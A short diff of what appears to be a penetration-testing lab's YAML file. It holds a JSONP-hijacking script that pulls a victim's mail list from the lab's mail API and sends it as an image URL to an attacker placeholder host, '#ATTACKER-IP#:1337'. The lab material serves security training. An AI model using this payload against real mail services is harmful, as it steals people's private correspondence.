@@ -14,7 +14,7 @@
   - |
     <script>
       function updateMail(mail_ary){
-        document.write("<img src='http://172.23.42.150:8080/"+JSON.stringify(mail_ary)+"' />");
+        document.write("<img src='http://#ATTACKER-IP#:1337/"+JSON.stringify(mail_ary)+"' />");
       }
     </script>
     <script type='text/javascript' src='http://mail.#PENTESTLAB-DOMAIN#/api/mail.cgi?jsonp=updateMail'></script>
